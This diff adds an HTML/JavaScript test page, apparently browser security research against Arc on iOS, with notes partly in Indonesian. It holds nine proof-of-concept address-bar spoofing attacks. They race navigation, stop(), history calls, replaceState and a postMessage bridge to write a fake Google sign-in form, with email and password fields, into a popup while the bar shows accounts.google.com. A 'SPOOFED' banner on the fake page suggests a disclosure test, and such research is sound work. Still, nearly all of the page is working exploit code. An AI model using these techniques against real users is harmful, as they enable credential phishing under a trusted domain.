@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Refined 7A/4A — Timing Tuner</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0d1117;color:#c9d1d9;padding:12px 14px;padding-top:max(12px,env(safe-area-inset-top));padding-bottom:max(80px,env(safe-area-inset-bottom))}
+h1{font-size:17px;color:#58a6ff;margin-bottom:4px}
+.sub{color:#8b949e;font-size:12px;margin-bottom:14px;line-height:1.4}
+.cat{color:#f0883e;font-size:13px;font-weight:700;margin:18px 0 6px;padding:6px 0;border-top:1px solid #21262d}
+.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:12px;margin:8px 0}
+.card h3{color:#7ee787;font-size:13px;margin-bottom:4px}
+.desc{color:#8b949e;font-size:11px;line-height:1.4;margin-bottom:8px}
+.why{color:#d2a8ff;font-size:10px;font-style:italic;margin-bottom:8px}
+button{width:100%;padding:14px;background:#238636;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin:3px 0;-webkit-tap-highlight-color:transparent}
+button:active{opacity:.7}
+button.alt{background:#1f6feb}
+button.warn{background:#da3633}
+button.sm{padding:10px;font-size:13px;width:auto;display:inline-block;margin:2px}
+.row{display:flex;flex-wrap:wrap;gap:4px;margin-top:6px}
+.log{font-family:monospace;font-size:10px;color:#7ee787;background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:8px;margin-top:10px;max-height:150px;overflow:auto;white-space:pre-wrap;word-break:break-all;-webkit-user-select:text}
+.note{background:#1c1917;border:1px solid #78350f;border-radius:8px;padding:10px;margin:12px 0;font-size:11px;color:#fde68a;line-height:1.4}
+.result{background:#0d2818;border:1px solid #238636;border-radius:8px;padding:10px;margin:8px 0;font-size:11px;color:#7ee787;display:none}
+</style>
+</head>
+<body>
+
+<h1>Refined Timing Tuner — Arc iOS</h1>
+<p class="sub">
+  <b>Goal:</b> Find the exact timing where address bar shows <code>accounts.google.com</code> while phishing content persists<br>
+  <b>Based on:</b> 7A showed phishing → then Google loaded (timing too fast). These tests vary the delay.
+</p>
+
+<div class="note">
+  <b>Dari hasil testing sebelumnya:</b><br>
+  • 1A: URL kosong + title spoof ✅ (vuln)<br>
+  • 5B: URL kosong ✅ (vuln)<br>
+  • 7A: Phishing muncul lalu redirect ke Google (timing belum pas)<br>
+  • <b>Tes ini mencari timing yang tepat untuk 7A agar URL stuck di google.com</b>
+</div>
+
+<div id="log" class="log">ready</div>
+<button onclick="document.getElementById('log').textContent='cleared'" class="sm" style="background:#21262d;margin:6px 0">Clear Log</button>
+
+<script>
+var TARGET = 'https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn';
+var PHISH = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title></head>' +
+  '<body style="font-family:-apple-system,sans-serif;background:#fff;margin:0;padding:0">' +
+  '<div style="max-width:380px;margin:0 auto;padding:40px 24px;text-align:center">' +
+  '<div style="font-size:24px;margin-bottom:4px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>' +
+  '<h1 style="font-size:20px;font-weight:400;color:#202124;margin:8px 0">Sign in</h1>' +
+  '<p style="color:#5f6368;font-size:14px;margin-bottom:20px">to continue to your account</p>' +
+  '<div style="background:#ffe0e0;color:#c00;padding:10px;border-radius:6px;font-size:13px;font-weight:700;margin-bottom:16px">SPOOFED — Check address bar!</div>' +
+  '<input placeholder="Email or phone" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:6px 0;-webkit-appearance:none">' +
+  '<input type="password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:6px 0;-webkit-appearance:none">' +
+  '<div style="display:flex;justify-content:space-between;align-items:center;margin-top:20px">' +
+  '<a href="#" style="color:#1a73e8;text-decoration:none;font-size:14px">Create account</a>' +
+  '<button style="background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500">Next</button>' +
+  '</div></div></body></html>';
+
+function L(m) {
+  var d = new Date();
+  var t = '[' + d.getMinutes() + ':' + d.getSeconds() + '.' + (d.getMilliseconds()+'').padStart(3,'0') + '] ';
+  var el = document.getElementById('log');
+  el.textContent += '\n' + t + m;
+  el.scrollTop = el.scrollHeight;
+}
+
+function tryWrite(w, tag) {
+  try {
+    w.document.open();
+    w.document.write(PHISH);
+    w.document.close();
+    L(tag + ': write OK');
+    return true;
+  } catch(e) { L(tag + ': write BLOCKED — ' + e.message); return false; }
+}
+
+// ═══════════════════════════════════════
+// R1: Refined 7A — write → navigate → back with variable delay
+// Original 7A used 30ms for back(). Too fast.
+// ═══════════════════════════════════════
+</script>
+
+<div class="cat">R1 — Write → Navigate → Back (variable delay)</div>
+<p class="desc">Masalah 7A original: back() di 30ms terlalu cepat, Google sudah commit.
+Tes ini coba delay 100ms-2000ms — cari titik dimana bar sudah update ke google.com tapi halaman belum fully committed.</p>
+
+<div class="card">
+  <h3>R1 · Variable back() delay</h3>
+  <div class="why">Navigasi ke Google butuh ~200-800ms di mobile. back() harus dipanggil SETELAH bar update tapi SEBELUM page commit.</div>
+  <div class="row">
+    <button class="sm" onclick="testR1(100)">100ms</button>
+    <button class="sm" onclick="testR1(200)">200ms</button>
+    <button class="sm" onclick="testR1(300)">300ms</button>
+    <button class="sm" onclick="testR1(500)">500ms</button>
+    <button class="sm" onclick="testR1(800)">800ms</button>
+    <button class="sm" onclick="testR1(1000)">1000ms</button>
+    <button class="sm" onclick="testR1(1500)">1500ms</button>
+    <button class="sm" onclick="testR1(2000)">2000ms</button>
+  </div>
+</div>
+
+<script>
+function testR1(delay) {
+  L('R1@' + delay + 'ms: write → nav → wait → back');
+  var w = window.open('about:blank', '_blank');
+  if (!w) { L('R1: popup blocked'); return; }
+  setTimeout(function() {
+    tryWrite(w, 'R1-write');
+    try { w.location.href = TARGET; L('R1: nav started'); } catch(e) { L('R1: nav err'); }
+    setTimeout(function() {
+      try { w.stop(); L('R1: stop()'); } catch(e) {}
+      try { w.history.back(); L('R1: back() @' + delay + 'ms'); } catch(e) { L('R1: back err'); }
+    }, delay);
+  }, 50);
+}
+</script>
+
+<div class="cat">R2 — Navigate → stop() at precise timing → write</div>
+<p class="desc">Variant: navigate dulu ke Google (bar update), lalu stop() di timing yang tepat sebelum page commit, lalu write phishing ke document yang masih about:blank.</p>
+
+<div class="card">
+  <h3>R2 · Navigate → stop → write</h3>
+  <div class="why">Kalau stop() dipanggil setelah bar update tapi sebelum page fully loads, content masih writable tapi bar sudah menunjukkan google.com.</div>
+  <div class="row">
+    <button class="sm" onclick="testR2(1)">1ms</button>
+    <button class="sm" onclick="testR2(5)">5ms</button>
+    <button class="sm" onclick="testR2(10)">10ms</button>
+    <button class="sm" onclick="testR2(20)">20ms</button>
+    <button class="sm" onclick="testR2(50)">50ms</button>
+    <button class="sm" onclick="testR2(100)">100ms</button>
+    <button class="sm" onclick="testR2(150)">150ms</button>
+    <button class="sm" onclick="testR2(200)">200ms</button>
+  </div>
+</div>
+
+<script>
+function testR2(delay) {
+  L('R2@' + delay + 'ms: nav → stop → write');
+  var w = window.open(TARGET, '_blank');
+  if (!w) { L('R2: popup blocked'); return; }
+  setTimeout(function() {
+    try { w.stop(); L('R2: stop() @' + delay + 'ms'); } catch(e) { L('R2: stop err'); }
+    setTimeout(function() {
+      tryWrite(w, 'R2-write@' + delay);
+    }, 10);
+  }, delay);
+}
+</script>
+
+<div class="cat">R3 — Named Window Reuse (longer initial load)</div>
+<p class="desc">Buka Google di named window, tunggu lebih lama agar bar fully committed ke google.com, lalu buka window dengan nama yang sama sebagai about:blank dan write phishing.</p>
+
+<div class="card">
+  <h3>R3 · Named window with variable load time</h3>
+  <div class="why">4A original terlalu cepat (500-3000ms). Kalau Google sudah fully load (bar committed), reopen mungkin preserve bar state tapi reset content.</div>
+  <div class="row">
+    <button class="sm" onclick="testR3(500)">500ms</button>
+    <button class="sm" onclick="testR3(1000)">1s</button>
+    <button class="sm" onclick="testR3(2000)">2s</button>
+    <button class="sm" onclick="testR3(3000)">3s</button>
+    <button class="sm" onclick="testR3(5000)">5s</button>
+    <button class="sm" onclick="testR3(8000)">8s</button>
+  </div>
+</div>
+
+<script>
+function testR3(delay) {
+  L('R3@' + delay + 'ms: named window reuse');
+  var name = 'sp_r3_' + Date.now();
+  var w = window.open(TARGET, name);
+  if (!w) { L('R3: popup blocked'); return; }
+  L('R3: opened Google in "' + name + '", waiting ' + delay + 'ms...');
+  setTimeout(function() {
+    L('R3: reopening as about:blank...');
+    var w2 = window.open('about:blank', name);
+    if (!w2) { L('R3: reopen failed'); return; }
+    setTimeout(function() {
+      tryWrite(w2, 'R3@' + delay);
+    }, 50);
+  }, delay);
+}
+</script>
+
+<div class="cat">R4 — Anchor Click + Navigate (1A hybrid)</div>
+<p class="desc">Karena 1A terbukti bisa write dengan URL kosong, kita combine: anchor.click() buka popup → write phishing → kemudian navigate popup ke Google → stop().</p>
+
+<div class="card">
+  <h3>R4 · Anchor click → write → navigate → stop</h3>
+  <div class="why">1A sudah buktikan write berhasil via anchor path. Setelah write, navigate ke Google agar bar update, lalu stop() agar konten tetap.</div>
+  <div class="row">
+    <button class="sm" onclick="testR4(50)">50ms</button>
+    <button class="sm" onclick="testR4(100)">100ms</button>
+    <button class="sm" onclick="testR4(200)">200ms</button>
+    <button class="sm" onclick="testR4(500)">500ms</button>
+    <button class="sm" onclick="testR4(1000)">1s</button>
+  </div>
+</div>
+
+<script>
+function testR4(stopDelay) {
+  L('R4@' + stopDelay + 'ms: anchor → write → nav → stop');
+  var a = document.createElement('a');
+  a.href = 'about:blank';
+  a.target = 'sp_r4';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  var w = window.open('', 'sp_r4');
+  if (!w) { L('R4: no ref'); return; }
+  setTimeout(function() {
+    if (tryWrite(w, 'R4-write')) {
+      L('R4: write done, navigating to Google...');
+      try { w.location.href = TARGET; L('R4: nav started'); } catch(e) { L('R4: nav err'); }
+      setTimeout(function() {
+        try { w.stop(); L('R4: stop() @' + stopDelay + 'ms'); } catch(e) { L('R4: stop err'); }
+      }, stopDelay);
+    }
+  }, 50);
+}
+</script>
+
+<div class="cat">R5 — replaceState after write (same-origin URL spoof)</div>
+<p class="desc">Setelah write ke about:blank berhasil, coba ubah URL bar pakai history.replaceState. Tidak bisa ganti origin, tapi bisa buat path yang misleading.</p>
+
+<div class="card">
+  <h3>R5 · Write → replaceState long path</h3>
+  <div class="why">Di layar kecil iPhone, address bar mungkin hanya menunjukkan awal path. Path panjang yang dimulai dengan "accounts.google.com/..." bisa misleading.</div>
+  <button onclick="testR5()">Test R5 — replaceState</button>
+</div>
+
+<script>
+function testR5() {
+  L('R5: write → replaceState');
+  var a = document.createElement('a');
+  a.href = 'about:blank';
+  a.target = 'sp_r5';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  var w = window.open('', 'sp_r5');
+  if (!w) { L('R5: no ref'); return; }
+  setTimeout(function() {
+    if (tryWrite(w, 'R5-write')) {
+      try {
+        w.history.replaceState({}, 'Sign in - Google Accounts',
+          '/accounts.google.com/signin/v2/identifier?service=mail&passive=1209600&continue=' +
+          encodeURIComponent('https://mail.google.com/mail/') +
+          '&flowName=GlifWebSignIn&flowEntry=ServiceLogin&authuser=0');
+        L('R5: replaceState OK — check if bar truncates to show "accounts.google.com"');
+      } catch(e) { L('R5: replaceState BLOCKED — ' + e.message); }
+    }
+  }, 50);
+}
+</script>
+
+<div class="cat">R6 — Anchor + slow target (predictable timing)</div>
+<p class="desc">Masalah timing: Google CDN terlalu cepat. Pakai target yang lebih lambat untuk memperlebar timing window.</p>
+
+<div class="card">
+  <h3>R6 · Slow target with stop()</h3>
+  <div class="why">Navigasi ke URL Google yang berat (search results dengan gambar) → bar update lebih awal dari page load → lebih besar timing window untuk stop().</div>
+  <div class="row">
+    <button class="sm" onclick="testR6('https://www.google.com/search?q=sign+in+to+google+account&tbm=isch',200)">Images 200ms</button>
+    <button class="sm" onclick="testR6('https://www.google.com/search?q=sign+in+to+google+account&tbm=isch',500)">Images 500ms</button>
+    <button class="sm" onclick="testR6('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&continue='+encodeURIComponent('https://drive.google.com'),200)">Drive 200ms</button>
+    <button class="sm" onclick="testR6('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&continue='+encodeURIComponent('https://drive.google.com'),500)">Drive 500ms</button>
+  </div>
+</div>
+
+<script>
+function testR6(target, stopDelay) {
+  L('R6: anchor → write → nav slow → stop@' + stopDelay);
+  var a = document.createElement('a');
+  a.href = 'about:blank';
+  a.target = 'sp_r6';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  var w = window.open('', 'sp_r6');
+  if (!w) { L('R6: no ref'); return; }
+  setTimeout(function() {
+    if (tryWrite(w, 'R6-write')) {
+      try { w.location.href = target; L('R6: nav to slow target'); } catch(e) { L('R6: nav err'); }
+      setTimeout(function() {
+        try { w.stop(); L('R6: stop @' + stopDelay + 'ms'); } catch(e) { L('R6: stop err'); }
+      }, stopDelay);
+    }
+  }, 50);
+}
+</script>
+
+<div class="cat">R7 — Double navigate race</div>
+<p class="desc">Navigate ke Google (bar update), immediately navigate ke about:blank (content reset), write phishing. Bar mungkin masih menunjukkan Google selama race.</p>
+
+<div class="card">
+  <h3>R7 · Google → about:blank → write</h3>
+  <div class="why">Dua navigasi cepat bisa race di WebKit IPC. Bar mungkin commit URL pertama (Google) tapi page commit URL kedua (about:blank → writable).</div>
+  <button onclick="testR7()">Test R7 — Double Nav Race</button>
+</div>
+
+<script>
+function testR7() {
+  L('R7: double navigate race');
+  var w = window.open(TARGET, '_blank');
+  if (!w) { L('R7: popup blocked'); return; }
+  setTimeout(function() {
+    try { w.location.href = 'about:blank'; L('R7: immediate redirect to about:blank'); } catch(e) { L('R7: err'); return; }
+    setTimeout(function() { tryWrite(w, 'R7-write'); }, 100);
+  }, 1);
+}
+</script>
+
+<div class="cat">R8 — Fragment navigation lock</div>
+<p class="desc">Navigate ke Google#fragment, lalu ganti fragment. Fragment change tidak trigger full navigation tapi mungkin mengunci bar state.</p>
+
+<div class="card">
+  <h3>R8 · Navigate Google → fragment change → write</h3>
+  <div class="why">Fragment navigasi (hash change) diproses berbeda di WebKit — tidak trigger WKNavigationDelegate tapi update bar. Bar mungkin stuck sementara document masih writable.</div>
+  <button onclick="testR8()">Test R8 — Fragment Lock</button>
+</div>
+
+<script>
+function testR8() {
+  L('R8: fragment navigation lock');
+  var w = window.open('about:blank', '_blank');
+  if (!w) { L('R8: popup blocked'); return; }
+  setTimeout(function() {
+    tryWrite(w, 'R8-initial');
+    try {
+      w.location.href = TARGET + '#step1';
+      L('R8: nav to google#step1');
+    } catch(e) { L('R8: err'); return; }
+    setTimeout(function() {
+      try { w.stop(); L('R8: stop'); } catch(e) {}
+      try { w.location.hash = '#step2'; L('R8: hash change'); } catch(e) {}
+      setTimeout(function() { tryWrite(w, 'R8-rewrite'); }, 50);
+    }, 150);
+  }, 50);
+}
+</script>
+
+<div class="cat">R9 — postMessage bridge write</div>
+<p class="desc">Buka Google di popup, inject postMessage listener sebelum Google load. Kalau listener persist setelah cross-origin nav, kita bisa trigger write dari parent.</p>
+
+<div class="card">
+  <h3>R9 · postMessage write after navigate</h3>
+  <div class="why">Jika event listener dari about:blank phase persists setelah navigasi mulai (tapi belum commit), message bisa trigger document.write di timing yang tepat.</div>
+  <button onclick="testR9()">Test R9 — postMessage</button>
+</div>
+
+<script>
+function testR9() {
+  L('R9: postMessage bridge');
+  var w = window.open('about:blank', '_blank');
+  if (!w) { L('R9: popup blocked'); return; }
+  setTimeout(function() {
+    try {
+      w.document.open();
+      w.document.write(
+        '<scr' + 'ipt>' +
+        'window.addEventListener("message",function(e){' +
+        '  if(e.data==="inject"){' +
+        '    document.open();' +
+        '    document.write(' + JSON.stringify(PHISH) + ');' +
+        '    document.close();' +
+        '    e.source.postMessage("R9:write-ok","*");' +
+        '  }' +
+        '});' +
+        'window.opener.postMessage("R9:listener-ready","*");' +
+        '<\/scr' + 'ipt>');
+      w.document.close();
+      L('R9: listener injected');
+    } catch(e) { L('R9: inject err'); return; }
+    window.addEventListener('message', function h(e) {
+      if (typeof e.data === 'string' && e.data.indexOf('R9:') === 0) {
+        L(e.data);
+        if (e.data === 'R9:listener-ready') {
+          try { w.location.href = TARGET; L('R9: nav started'); } catch(e2) {}
+          [50, 100, 200, 500].forEach(function(d) {
+            setTimeout(function() {
+              try { w.postMessage('inject', '*'); L('R9: inject sent @' + d); } catch(e3) { L('R9: send err @' + d); }
+            }, d);
+          });
+        }
+      }
+    });
+  }, 50);
+}
+</script>
+
+<div style="height:80px"></div>
+</body>
+</html>
